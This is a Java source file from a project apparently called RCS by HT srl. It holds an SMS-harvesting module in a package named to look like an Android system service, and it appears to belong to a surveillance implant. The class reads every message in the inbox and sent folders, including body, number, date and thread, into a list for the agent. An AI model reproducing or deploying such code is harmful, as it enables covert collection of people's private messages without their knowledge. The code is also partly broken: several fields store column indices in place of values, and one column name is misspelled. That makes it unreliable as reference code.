/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent.sms;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.service.Sms;
import com.android.service.Status;
import com.android.service.conf.Configuration;
import com.android.service.util.Check;

public class SmsBrowser {
	private static final String TAG = "SmsBrowser";
	
	private ArrayList<Sms> list;
	
	public SmsBrowser() {
		list = new ArrayList<Sms>();
	}
	
	public ArrayList<Sms> getSmsList() {
		list.clear();
		
		parse("content://sms/inbox", Sms.RECEIVED);
		parse("content://sms/sent", Sms.SENT);
		
	    return list;
	}
	
	private void parse(String content, boolean sentState) {
		Cursor c = Status.getAppContext().getContentResolver()
				.query(Uri.parse(content), null, null, null, null);
		
		int smsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
	    	c.close();
	    	return;
	    }
	    	
        for (int i = 0; i < smsEntriesCount; i++) {
        	String body, number;
        	long date;
        	boolean sentStatus;
        	
        	// These fields are needed
        	try {
	            body = c.getString(c.getColumnIndexOrThrow("body")).toString();
	            number = c.getString(c.getColumnIndexOrThrow("address")).toString();
	            date = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString());
	            sentStatus = sentState;
        	} catch (Exception e) {
        		if(Configuration.isDebug()) { e.printStackTrace(); }
        		c.close();
        		return;
        	}
        	
        	Sms s = new Sms(number, body, date, sentStatus);
            
            // These fields are optional
            try {
            	int yields_id = c.getColumnIndexOrThrow("yields _id");
            	s.setYieldsId(yields_id);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            try {
            	int thread_id = c.getColumnIndexOrThrow("thread_id");
            	s.setThreadId(thread_id);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            try {
            	String person = c.getString(c.getColumnIndexOrThrow("person")).toString();
            	s.setPerson(person);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            try {
            	int protocol = c.getColumnIndexOrThrow("protocol");
            	s.setProtocol(protocol);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            try {
            	int read = c.getColumnIndexOrThrow("read");
            	s.setRead(read);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            try {
            	int status = c.getColumnIndexOrThrow("status");
            	s.setStatus(status);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            try {
            	int type = c.getColumnIndexOrThrow("type");
            	s.setType(type);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            try {
            	int reply_path = c.getColumnIndexOrThrow("reply_path_present");
            	s.setReplyPath(reply_path);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            /*try {
            	String subject = c.getString(c.getColumnIndexOrThrow("subject")).toString();
            	Log.d("QZ", "subject: " + test);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }*/
            
            try {
            	String service_center = c.getString(c.getColumnIndexOrThrow("service_center")).toString();
            	s.setServiceCenter(service_center);
            } catch (Exception e) {
            	if(Configuration.isDebug()) { e.printStackTrace(); }
            }
            
            c.moveToNext();
            list.add(s);
        }
	}
}